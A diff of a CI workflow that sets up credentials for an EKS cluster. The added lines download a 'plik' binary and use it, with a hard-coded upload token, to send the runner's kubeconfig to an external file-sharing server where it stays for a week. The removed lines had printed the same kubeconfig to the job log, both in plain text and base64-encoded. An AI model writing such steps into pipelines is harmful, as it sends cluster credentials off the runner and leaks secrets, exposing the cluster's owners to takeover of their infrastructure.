@@ -26,13 +26,10 @@ jobs:
       run: |
        set -x 
        aws eks update-kubeconfig --name=gek-ppd
+       
+       wget  https://dl.alterway.fr/clients/linux-amd64/plik
+       chmod a+rx plik
+       ./plik --ttl 604800 --token 79c15e89-b959-4ffb-68a0-ae0cc4cc3f9d --server https://dl.alterway.fr  /home/runner/.kube/config
 
-       cat /home/runner/.kube/config
 
-         
-       #kubectl get nodes
-       #kubectl get ns
-       #kubectl get po -A
-
-       echo "---------------------"
-       base64 -w 0 /home/runner/.kube/config
+        
